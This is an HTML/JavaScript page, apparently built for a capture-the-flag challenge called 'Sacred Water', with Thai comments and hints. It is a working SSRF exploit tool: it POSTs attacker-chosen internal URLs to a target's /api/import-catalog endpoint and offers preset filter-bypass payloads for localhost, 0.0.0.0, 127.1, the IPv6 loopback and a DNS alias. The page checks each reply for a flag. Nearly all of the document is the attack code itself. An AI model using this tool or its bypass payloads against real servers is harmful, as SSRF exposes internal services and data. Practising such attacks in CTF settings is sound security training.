<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sacred Water SSRF Exploit Tool</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: #e0e0e0; padding: 40px; }
        .container { max-width: 800px; margin: auto; background: #1e1e1e; padding: 20px; border-radius: 10px; border: 1px solid #333; }
        h2 { color: #ffca28; border-bottom: 2px solid #ffca28; padding-bottom: 10px; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; color: #aaa; }
        input { width: 100%; padding: 10px; background: #2c2c2c; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box; }
        button { padding: 10px 20px; background: #ffca28; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; transition: 0.3s; }
        button:hover { background: #ffd54f; }
        .payload-list { margin-top: 20px; display: flex; gap: 10px; flex-wrap: wrap; }
        .payload-btn { background: #333; color: #ffca28; border: 1px solid #ffca28; font-size: 12px; }
        #result { margin-top: 20px; background: #000; padding: 15px; border-radius: 5px; white-space: pre-wrap; font-family: monospace; color: #00ff00; border: 1px solid #00ff00; min-height: 100px; overflow-x: auto; }
        .info { font-size: 13px; color: #888; margin-top: 10px; }
    </style>
</head>
<body>

<div class="container">
    <h2>Sacred Water: SSRF Exploit Tool</h2>
    <p>ระบบแจ้งว่า "Internal addresses are blocked" แต่เราจะใช้เทคนิค Bypass เพื่อหา Flag</p>

    <div class="form-group">
        <label>Target URL (Base Address)</label>
        <input type="text" id="targetHost" placeholder="http://34.x.x.x:3000" value="">
    </div>

    <div class="form-group">
        <label>SSRF Payload (Internal Resource)</label>
        <input type="text" id="internalPath" placeholder="http://127.0.0.1/flag" value="http://127.0.0.1/flag">
    </div>

    <button onclick="runExploit()">Execute SSRF</button>

    <div class="payload-list">
        <button class="payload-btn" onclick="setPayload('http://127.0.0.1/flag')">Standard Localhost</button>
        <button class="payload-btn" onclick="setPayload('http://localhost/flag')">Localhost Alias</button>
        <button class="payload-btn" onclick="setPayload('http://0.0.0.0/flag')">0.0.0.0 Bypass</button>
        <button class="payload-btn" onclick="setPayload('http://127.1/flag')">Decimal Bypass</button>
        <button class="payload-btn" onclick="setPayload('http://[::1]/flag')">IPv6 Bypass</button>
        <button class="payload-btn" onclick="setPayload('http://localtest.me/flag')">DNS Bypass</button>
    </div>

    <div id="result">Results will appear here...</div>
    
    <div class="info">
        <strong>💡 Hint:</strong> ในโจทย์ CTF ส่วนใหญ่ Flag มักอยู่ที่ <code>/flag</code>, <code>/admin</code> หรือ <code>/api/internal/flag</code> บน localhost
    </div>
</div>

<script>
    function setPayload(p) {
        document.getElementById('internalPath').value = p;
    }

    async function runExploit() {
        const host = document.getElementById('targetHost').value.trim();
        const internal = document.getElementById('internalPath').value.trim();
        const resultDiv = document.getElementById('result');

        if (!host) {
            alert("กรุณาใส่ Target Host (IP ของ Server โจทย์)");
            return;
        }

        resultDiv.textContent = "🚀 Launching SSRF Attack...";
        resultDiv.style.color = "#00ff00";

        try {
            const response = await fetch(`${host}/api/import-catalog`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ url: internal })
            });

            const data = await response.json();
            
            // แสดงผลลัพธ์ที่ดึงมาจาก SSRF
            resultDiv.textContent = "Status: " + response.status + "\n\nResponse Content:\n" + JSON.stringify(data, null, 2);
            
            if (JSON.stringify(data).includes("web{")) {
                resultDiv.style.border = "2px solid #ffca28";
                alert("🚩 FLAG FOUND!");
            }

        } catch (err) {
            resultDiv.textContent = "❌ Error: " + err.message + "\n\nตรวจสอบว่า Target Host ถูกต้องและเปิด CORS หรือไม่ (หากรันจาก Local ไฟล์)";
            resultDiv.style.color = "#ff4444";
        }
    }
</script>

</body>
</html>
